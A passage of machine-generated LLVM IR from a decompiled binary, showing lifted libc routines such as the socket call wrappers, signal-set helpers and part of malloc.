dec_label_pc_16004:                               ; preds = %entry, %dec_label_pc_15ff4
  %v0_16004 = phi i32 [ %v5_15fe4, %entry ], [ -1, %dec_label_pc_15ff4 ]
  %v2_16008 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16008, i32* @r4, align 4
  ret i32 %v0_16004

; uselistorder directives
  uselistorder i32 %v5_15fe4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16004, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1600c = load i32, i32* @r4, align 4
  store i32 %v3_1600c, i32* %stack_var_-8, align 4
  %v5_16010 = inttoptr i32 %arg3 to i32*
  %v6_16010 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_16010)
  store i32 %v6_16010, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_16010, -4095
  br i1 %tmp, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v6_16020 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_16020, i32* @r4, align 4
  ret i32 %v6_16010

bb4:                                              ; preds = %entry
  %v0_16024 = call i32 @__GI___errno_location()
  %v0_16028 = load i32, i32* %r4.global-to-local, align 4
  %v1_16028 = sub i32 0, %v0_16028
  %v2_1602c = inttoptr i32 %v0_16024 to i32*
  store i32 %v1_16028, i32* %v2_1602c, align 4
  %v2_16034 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16034, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v6_16010, { 1, 0, 2 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16038 = load i32, i32* @r4, align 4
  store i32 %v3_16038, i32* %stack_var_-8, align 4
  %v0_16040 = call i32 @getsockopt()
  store i32 %v0_16040, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16040, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_16050 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_16050, i32* @r4, align 4
  ret i32 %v0_16040

bb3:                                              ; preds = %entry
  %v0_16054 = call i32 @__GI___errno_location()
  %v0_16058 = load i32, i32* %r4.global-to-local, align 4
  %v1_16058 = sub i32 0, %v0_16058
  %v2_1605c = inttoptr i32 %v0_16054 to i32*
  store i32 %v1_16058, i32* %v2_1605c, align 4
  %v2_16064 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16064, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_16040, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 4, 2, 1, 3, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16068 = load i32, i32* @r4, align 4
  store i32 %v3_16068, i32* %stack_var_-8, align 4
  %v5_1606c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_1606c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1606c, -4095
  br i1 %tmp, label %dec_label_pc_1608c, label %dec_label_pc_1607c

dec_label_pc_1607c:                               ; preds = %entry
  %v0_1607c = call i32 @__GI___errno_location()
  %v0_16080 = load i32, i32* %r4.global-to-local, align 4
  %v1_16080 = sub i32 0, %v0_16080
  %v2_16084 = inttoptr i32 %v0_1607c to i32*
  store i32 %v1_16080, i32* %v2_16084, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1608c

dec_label_pc_1608c:                               ; preds = %entry, %dec_label_pc_1607c
  %v0_1608c = phi i32 [ %v5_1606c, %entry ], [ -1, %dec_label_pc_1607c ]
  %v2_16090 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16090, i32* @r4, align 4
  ret i32 %v0_1608c

; uselistorder directives
  uselistorder i32 %v5_1606c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1608c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16094 = load i32, i32* @r4, align 4
  store i32 %v3_16094, i32* %stack_var_-8, align 4
  %v5_16098 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_16098, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16098, -4095
  br i1 %tmp, label %dec_label_pc_160b8, label %dec_label_pc_160a8

dec_label_pc_160a8:                               ; preds = %entry
  %v0_160a8 = call i32 @__GI___errno_location()
  %v0_160ac = load i32, i32* %r4.global-to-local, align 4
  %v1_160ac = sub i32 0, %v0_160ac
  %v2_160b0 = inttoptr i32 %v0_160a8 to i32*
  store i32 %v1_160ac, i32* %v2_160b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_160b8

dec_label_pc_160b8:                               ; preds = %entry, %dec_label_pc_160a8
  %v0_160b8 = phi i32 [ %v5_16098, %entry ], [ -1, %dec_label_pc_160a8 ]
  %v2_160bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_160bc, i32* @r4, align 4
  ret i32 %v0_160b8

; uselistorder directives
  uselistorder i32 %v5_16098, { 1, 0, 2 }
  uselistorder label %dec_label_pc_160b8, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_160c0 = load i32, i32* @r4, align 4
  store i32 %v3_160c0, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_160cc = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_160cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_160cc, -4095
  br i1 %tmp, label %dec_label_pc_160ec, label %dec_label_pc_160dc

dec_label_pc_160dc:                               ; preds = %entry
  %v0_160dc = call i32 @__GI___errno_location()
  %v0_160e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_160e0 = sub i32 0, %v0_160e0
  %v2_160e4 = inttoptr i32 %v0_160dc to i32*
  store i32 %v1_160e0, i32* %v2_160e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_160ec

dec_label_pc_160ec:                               ; preds = %entry, %dec_label_pc_160dc
  %v0_160ec = phi i32 [ %v5_160cc, %entry ], [ -1, %dec_label_pc_160dc ]
  %v2_160f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_160f0, i32* @r4, align 4
  ret i32 %v0_160ec

; uselistorder directives
  uselistorder i32 %v5_160cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_160ec, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_160f4 = load i32, i32* @r4, align 4
  store i32 %v3_160f4, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_160fc = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_160fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_160fc, -4095
  br i1 %tmp, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v6_1610c = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_1610c, i32* @r4, align 4
  ret i32 %v5_160fc

bb4:                                              ; preds = %entry
  %v0_16110 = call i32 @__GI___errno_location()
  %v0_16114 = load i32, i32* %r4.global-to-local, align 4
  %v1_16114 = sub i32 0, %v0_16114
  %v2_16118 = inttoptr i32 %v0_16110 to i32*
  store i32 %v1_16114, i32* %v2_16118, align 4
  %v2_16120 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16120, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v5_160fc, { 1, 0, 2 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16124 = load i32, i32* @r4, align 4
  store i32 %v3_16124, i32* %stack_var_-8, align 4
  %v0_16128 = call i32 @socket()
  store i32 %v0_16128, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16128, -4095
  br i1 %tmp, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v6_16138 = load i32, i32* %stack_var_-8, align 4
  store i32 %v6_16138, i32* @r4, align 4
  ret i32 %v0_16128

bb3:                                              ; preds = %entry
  %v0_1613c = call i32 @__GI___errno_location()
  %v0_16140 = load i32, i32* %r4.global-to-local, align 4
  %v1_16140 = sub i32 0, %v0_16140
  %v2_16144 = inttoptr i32 %v0_1613c to i32*
  store i32 %v1_16140, i32* %v2_16144, align 4
  %v2_1614c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1614c, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_16128, { 1, 0, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_1616c, label %dec_label_pc_1615c

dec_label_pc_1615c:                               ; preds = %entry
  %v8_16160 = icmp sgt i32 %arg1, 64
  br i1 %v8_16160, label %dec_label_pc_1616c, label %dec_label_pc_16164

dec_label_pc_16164:                               ; preds = %dec_label_pc_1615c
  %v0_16168 = call i32 @__sigaddset()
  br label %dec_label_pc_1616c

dec_label_pc_1616c:                               ; preds = %dec_label_pc_1615c, %entry, %dec_label_pc_16164
  %v0_1616c = call i32 @__GI___errno_location()
  %v2_16174 = inttoptr i32 %v0_1616c to i32*
  store i32 22, i32* %v2_16174, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1616c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_16188 = add i32 %tmp, 4
  %v3_16188 = inttoptr i32 %v2_16188 to i32*
  store i32 0, i32* %v3_16188, align 4
  %v1_1618c = load i32, i32* %r3.global-to-local, align 4
  %v2_1618c = inttoptr i32 %v1_1618c to i32*
  store i32 0, i32* %v2_1618c, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16194 = load i32, i32* @r4, align 4
  store i32 %v3_16194, i32* %stack_var_-12, align 4
  %v6_16194 = load i32, i32* @r5, align 4
  %v7_16198 = icmp eq i32 %arg2, -1
  br i1 %v7_16198, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_161a0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp27 = icmp slt i32 %arg1, 1
  br i1 %tmp27, label %.thread16, label %dec_label_pc_161b8

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_161c0

dec_label_pc_161b8:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_161bc = icmp slt i32 %arg1, 65
  br i1 %v7_161bc, label %dec_label_pc_161d4, label %dec_label_pc_161c0

dec_label_pc_161c0:                               ; preds = %.thread16, %dec_label_pc_161b8
  %v0_161c0 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_161cc = inttoptr i32 %v0_161c0 to i32*
  store i32 22, i32* %v2_161cc, align 4
  %v0_16228.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb32

dec_label_pc_161d4:                               ; preds = %dec_label_pc_161b8
  %v2_161d4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_161d4, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_161dc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_161dc, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v0_161ec = call i32 @__sigaddset()
  %v0_161f0 = load i32, i32* @r5, align 4
  %v2_161f8 = call i32 @__GI___sigismember(i32 ptrtoint (i32* @global_var_34714.1418 to i32), i32 %v0_161f0)
  store i32 %v2_161a0, i32* %r2.global-to-local, align 4
  %v0_16210 = load i32, i32* @r5, align 4
  %v3_16218 = call i32 @__libc_sigaction(i32 %v0_16210, i32 %v2_161d4, i32 %v2_161a0)
  %v1_1621c = icmp slt i32 %v3_16218, 0
  br i1 %v1_1621c, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_161d4
  %v5_16220 = load i32, i32* %stack_var_-52, align 4
  store i32 %v5_16220, i32* %r2.global-to-local, align 4
  br label %bb32

bb31:                                             ; preds = %dec_label_pc_161d4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %bb30, %dec_label_pc_161c0, %bb31
  %v0_16228 = phi i32 [ %v5_16220, %bb30 ], [ %v0_16228.pre, %dec_label_pc_161c0 ], [ -1, %bb31 ]
  %v2_16230 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16230, i32* @r4, align 4
  store i32 %v6_16194, i32* @r5, align 4
  ret i32 %v0_16228

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb32, { 2, 0, 1 }
  uselistorder label %dec_label_pc_161c0, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16238 = add i32 %arg2, -1
  %v3_1623c = udiv i32 %v1_16238, 32
  %v4_16240 = mul nuw nsw i32 %v3_1623c, 4
  %v5_16240 = add i32 %v4_16240, %arg1
  %v6_16240 = inttoptr i32 %v5_16240 to i32*
  %v7_16240 = load i32, i32* %v6_16240, align 4
  %v1_16244 = urem i32 %v1_16238, 32
  %v7_1624c = shl i32 1, %v1_16244
  %v8_1624c = and i32 %v7_16240, %v7_1624c
  %v10_1624c = icmp ne i32 %v8_1624c, 0
  %. = zext i1 %v10_1624c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_16238, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_1625c = load i32, i32* @r1, align 4
  %v1_1625c = add i32 %v0_1625c, -1
  %v3_16260 = udiv i32 %v1_1625c, 32
  %v0_16264 = load i32, i32* @r0, align 4
  %v4_16264 = mul nuw nsw i32 %v3_16260, 4
  %v5_16264 = add i32 %v0_16264, %v4_16264
  %v6_16264 = inttoptr i32 %v5_16264 to i32*
  %v7_16264 = load i32, i32* %v6_16264, align 4
  %v1_16268 = urem i32 %v1_1625c, 32
  %v7_16270 = shl i32 1, %v1_16268
  %v8_16270 = or i32 %v7_16264, %v7_16270
  store i32 %v8_16270, i32* %v6_16264, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1625c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_16280 = add i32 %arg2, -1
  %v3_16284 = udiv i32 %v1_16280, 32
  %v4_16288 = mul nuw nsw i32 %v3_16284, 4
  %v5_16288 = add i32 %v4_16288, %arg1
  %v6_16288 = inttoptr i32 %v5_16288 to i32*
  %v7_16288 = load i32, i32* %v6_16288, align 4
  %v1_1628c = urem i32 %v1_16280, 32
  %tmp = shl i32 -1, %v1_1628c
  %v8_16294 = add i32 %tmp, -1
  %v9_16294 = and i32 %v7_16288, %v8_16294
  store i32 %v9_16294, i32* %v6_16288, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16280, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %v3_162a4 = udiv i32 %arg1, 256
  %v2_162a8 = icmp ugt i32 %arg1, 16777215
  br i1 %v2_162a8, label %bb, label %.thread

bb:                                               ; preds = %entry
  ret i32 95

.thread:                                          ; preds = %entry
  %v1_162b8 = add nuw nsw i32 %v3_162a4, 1048320
  %v3_162bc = udiv i32 %v1_162b8, 65536
  %v1_162c0 = and i32 %v3_162bc, 8
  %v6_162c4 = shl i32 %v3_162a4, %v1_162c0
  %v1_162c8 = add i32 %v6_162c4, 520192
  %v3_162cc = udiv i32 %v1_162c8, 65536
  %v1_162d0 = and i32 %v3_162cc, 4
  %v6_162d4 = shl i32 %v6_162c4, %v1_162d0
  %v1_162d8 = add i32 %v6_162d4, 245760
  %v3_162dc = udiv i32 %v1_162d8, 65536
  %v1_162e0 = and i32 %v3_162dc, 2
  %v6_162e4 = shl i32 %v6_162d4, %v1_162e0
  %v1_162e8 = sub nsw i32 13, %v1_162c0
  %v2_162ec = sub nsw i32 %v1_162e8, %v1_162d0
  %v3_162f0 = udiv i32 %v6_162e4, 32768
  %v4_162f0 = sub nuw nsw i32 -1, %v3_162f0
  %v4_162f4 = udiv i32 %v6_162e4, 16384
  %v5_162f4 = and i32 %v4_162f4, %v4_162f0
  %v2_162f8 = sub nsw i32 %v2_162ec, %v1_162e0
  %v2_162fc = add nsw i32 %v2_162f8, %v5_162f4
  %v1_16300 = add nsw i32 %v2_162fc, 6
  %v6_16304 = lshr i32 %arg1, %v1_16300
  %v3_16308 = mul nsw i32 %v2_162fc, 4
  %v1_1630c = add nsw i32 %v3_16308, 32
  %v1_16310 = urem i32 %v6_16304, 4
  %v2_16314 = or i32 %v1_16310, %v1_1630c
  ret i32 %v2_16314

; uselistorder directives
  uselistorder i32 %v3_162a4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_1631c = load i32, i32* @r4, align 4
  %v6_1631c = load i32, i32* @r5, align 4
  %v9_1631c = load i32, i32* @r6, align 4
  %v12_1631c = load i32, i32* @r7, align 4
  %v15_1631c = load i32, i32* @r8, align 4
  %v18_1631c = load i32, i32* @sb, align 4
  %v21_1631c = load i32, i32* @sl, align 4
  %v24_1631c = load i32, i32* @fp, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  %v2_1632c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1632c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2e330.1421 to i32), i32* @r2, align 4
  store i32 98440, i32* %r3.global-to-local, align 4
  store i32 90944, i32* %lr.global-to-local, align 4
  %v1_1633c = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2e330.1421 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16350.1436 to i32), i32* @lr, align 4
  %v2_1634c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e330.1421 to i32))
  store i32 %v2_1634c, i32* %r0.global-to-local, align 4
  %v0_16350 = load i32, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16350, -32
  br i1 %tmp, label %dec_label_pc_1636c, label %dec_label_pc_16358

dec_label_pc_16358:                               ; preds = %entry
  %v0_16358 = call i32 @__GI___errno_location()
  store i32 %v0_16358, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16364 = inttoptr i32 %v0_16358 to i32*
  store i32 12, i32* %v2_16364, align 4
  br label %dec_label_pc_16b34

dec_label_pc_1636c:                               ; preds = %entry
  %v1_1636c = add i32 %v0_16350, 11
  store i32 %v1_1636c, i32* %r0.global-to-local, align 4
  %v2_16370 = icmp ugt i32 %v1_1636c, 14
  %v7_16370 = icmp eq i32 %v1_1636c, 15
  %v2_16374 = xor i1 %v7_16370, true
  %v3_16374 = and i1 %v2_16370, %v2_16374
  br i1 %v3_16374, label %bb, label %bb162

bb:                                               ; preds = %dec_label_pc_1636c
  %v5_16374 = and i32 %v1_1636c, -8
  store i32 %v5_16374, i32* @sl, align 4
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_1636c, %bb
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r0, align 4
  %v2_1637c = load i32, i32* @global_var_3471c.1425, align 4
  store i32 %v2_1637c, i32* @r4, align 4
  %v2_16380 = xor i1 %v2_16370, true
  %v3_16380 = or i1 %v7_16370, %v2_16380
  br i1 %v3_16380, label %bb163, label %bb164

bb163:                                            ; preds = %bb162
  store i32 16, i32* @sl, align 4
  br label %bb164

bb164:                                            ; preds = %bb162, %bb163
  %v1_16384 = urem i32 %v2_1637c, 2
  %v2_16384 = icmp eq i32 %v1_16384, 0
  br i1 %v2_16384, label %dec_label_pc_1638c, label %dec_label_pc_1639c

dec_label_pc_1638c:                               ; preds = %bb164
  %v2_1638c = icmp eq i32 %v2_1637c, 0
  br i1 %v2_1638c, label %dec_label_pc_16394, label %dec_label_pc_16720

dec_label_pc_16394:                               ; preds = %dec_label_pc_1638c
  %v0_16394 = call i32 @__malloc_consolidate()
  store i32 %v0_16394, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16720

dec_label_pc_1639c:                               ; preds = %bb164
  %v0_1639c = load i32, i32* @sl, align 4
  %tmp238 = icmp ugt i32 %v0_1639c, %v2_1637c
  br i1 %tmp238, label %dec_label_pc_163c4, label %dec_label_pc_163a4

dec_label_pc_163a4:                               ; preds = %dec_label_pc_1639c
  store i32 ptrtoint (i32* @global_var_34718.1427 to i32), i32* %r1.global-to-local, align 4
  %v3_163a8 = udiv i32 %v0_1639c, 8
  store i32 %v3_163a8, i32* @r2, align 4
  %v4_163ac = mul nuw i32 %v3_163a8, 4
  %v5_163ac = add i32 %v4_163ac, ptrtoint (i32* @global_var_34718.1427 to i32)
  %v6_163ac = inttoptr i32 %v5_163ac to i32*
  %v7_163ac = load i32, i32* %v6_163ac, align 4
  store i32 %v7_163ac, i32* %r0.global-to-local, align 4
  %v2_163b0 = icmp eq i32 %v7_163ac, 0
  br i1 %v2_163b0, label %dec_label_pc_163c4, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_163a4
  %v2_163b4 = add i32 %v7_163ac, 8
  %v3_163b4 = inttoptr i32 %v2_163b4 to i32*
  %v4_163b4 = load i32, i32* %v3_163b4, align 4
  store i32 %v4_163b4, i32* %r3.global-to-local, align 4
  store i32 %v2_163b4, i32* %r0.global-to-local, align 4
  store i32 %v2_163b4, i32* %r4.global-to-local, align 4
  store i32 %v4_163b4, i32* %v6_163ac, align 4
  br label %dec_label_pc_16b20

dec_label_pc_163c4:                               ; preds = %dec_label_pc_163a4, %dec_label_pc_1639c
  %tmp239 = icmp ugt i32 %v0_1639c, 255
  br i1 %tmp239, label %dec_label_pc_1640c, label %dec_label_pc_163cc

dec_label_pc_163cc:                               ; preds = %dec_label_pc_163c4
  %v3_163d0 = udiv i32 %v0_1639c, 8
  store i32 %v3_163d0, i32* @r8, align 4
  %v4_163d4 = mul nuw i32 %v3_163d0, 8
  %v5_163d4 = add i32 %v4_163d4, ptrtoint (i32* @global_var_34750.1429 to i32)
  store i32 %v5_163d4, i32* %r3.global-to-local, align 4
  %v1_163d8 = add i32 %v4_163d4, add (i32 ptrtoint (i32* @global_var_34750.1429 to i32), i32 -8)
  store i32 %v1_163d8, i32* @ip, align 4
  %v1_163dc = add i32 %v4_163d4, add (i32 ptrtoint (i32* @global_var_34750.1429 to i32), i32 4)
  %v2_163dc = inttoptr i32 %v1_163dc to i32*
  %v3_163dc = load i32, i32* %v2_163dc, align 4
  store i32 %v3_163dc, i32* %r0.global-to-local, align 4
  %v9_163e0 = icmp eq i32 %v3_163dc, %v1_163d8
  br i1 %v9_163e0, label %dec_label_pc_16544, label %dec_label_pc_163e8

dec_label_pc_163e8:                               ; preds = %dec_label_pc_163cc
  %v2_163e8 = add i32 %v3_163dc, %v0_1639c
  store i32 %v2_163e8, i32* %r3.global-to-local, align 4
  %v1_163ec = add i32 %v2_163e8, 4
  %v2_163ec = inttoptr i32 %v1_163ec to i32*
  %v3_163ec = load i32, i32* %v2_163ec, align 4
  store i32 %v3_163ec, i32* %r2.global-to-local, align 4
  %v1_163f0 = add i32 %v3_163dc, 12
  %v2_163f0 = inttoptr i32 %v1_163f0 to i32*
  %v3_163f0 = load i32, i32* %v2_163f0, align 4
  store i32 %v3_163f0, i32* %r1.global-to-local, align 4
  %v1_163f4 = or i32 %v3_163ec, 1
  store i32 %v1_163f4, i32* @r2, align 4
  %v1_163f8 = add i32 %v3_163dc, 8
  store i32 %v1_163f8, i32* %r4.global-to-local, align 4
  store i32 %v1_163f4, i32* %v2_163ec, align 4
  %v0_16400 = load i32, i32* @ip, align 4
  %v1_16400 = load i32, i32* %r1.global-to-local, align 4
  %v2_16400 = add i32 %v1_16400, 8
  %v3_16400 = inttoptr i32 %v2_16400 to i32*
  store i32 %v0_16400, i32* %v3_16400, align 4
  %v0_16404 = load i32, i32* %r1.global-to-local, align 4
  %v1_16404 = load i32, i32* @ip, align 4
  %v2_16404 = add i32 %v1_16404, 12
  %v3_16404 = inttoptr i32 %v2_16404 to i32*
  store i32 %v0_16404, i32* %v3_16404, align 4
  br label %dec_label_pc_16b20

dec_label_pc_1640c:                               ; preds = %dec_label_pc_163c4
  store i32 %v0_1639c, i32* %r0.global-to-local, align 4
  %v1_16410 = call i32 @__malloc_largebin_index(i32 %v0_1639c)
  store i32 %v1_16410, i32* %r0.global-to-local, align 4
  %v0_16414 = load i32, i32* @r4, align 4
  %v1_16414 = and i32 %v0_16414, 2
  %v2_16414 = icmp eq i32 %v1_16414, 0
  store i32 %v1_16410, i32* @r8, align 4
  br i1 %v2_16414, label %dec_label_pc_16544, label %dec_label_pc_16420

dec_label_pc_16420:                               ; preds = %dec_label_pc_1640c
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* @r0, align 4
  %v0_16424 = call i32 @__malloc_consolidate()
  store i32 %v0_16424, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16544

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16544, %dec_label_pc_16518
  %v0_16498 = phi i32 [ %v1_16558, %dec_label_pc_16518 ], [ ptrtoint (i32* @global_var_34750.1429 to i32), %dec_label_pc_16544 ]
  %v1_16494 = phi i32 [ %v0_16560.pre, %dec_label_pc_16518 ], [ %v0_1654c, %dec_label_pc_16544 ]
  %v0_1646c = phi i32 [ %v3_16554, %dec_label_pc_16518 ], [ %v3_1655458, %dec_label_pc_16544 ]
  %v1_1642c = add i32 %v0_1646c, 4
  %v2_1642c = inttoptr i32 %v1_1642c to i32*
  %v3_1642c = load i32, i32* %v2_1642c, align 4
  store i32 %v3_1642c, i32* %r3.global-to-local, align 4
  %v1_16434 = and i32 %v3_1642c, -4
  store i32 %v1_16434, i32* %r4.global-to-local, align 4
  %v1_16438 = add i32 %v0_1646c, 12
  %v2_16438 = inttoptr i32 %v1_16438 to i32*
  %v3_16438 = load i32, i32* %v2_16438, align 4
  store i32 %v3_16438, i32* @ip, align 4
  %tmp240 = icmp ugt i32 %v1_16494, 255
  br i1 %tmp240, label %dec_label_pc_16494, label %dec_label_pc_16440

dec_label_pc_16440:                               ; preds = %dec_label_pc_1642c
  %v9_16440 = icmp eq i32 %v3_16438, %v0_16498
  br i1 %v9_16440, label %dec_label_pc_16448, label %dec_label_pc_16494

dec_label_pc_16448:                               ; preds = %dec_label_pc_16440
  %v0_16448 = load i32, i32* %r6.global-to-local, align 4
  %v1_16448 = add i32 %v0_16448, 48
  %v2_16448 = inttoptr i32 %v1_16448 to i32*
  %v3_16448 = load i32, i32* %v2_16448, align 4
  store i32 %v3_16448, i32* %r3.global-to-local, align 4
  %v9_1644c = icmp eq i32 %v0_1646c, %v3_16448
  br i1 %v9_1644c, label %dec_label_pc_16454, label %dec_label_pc_16494

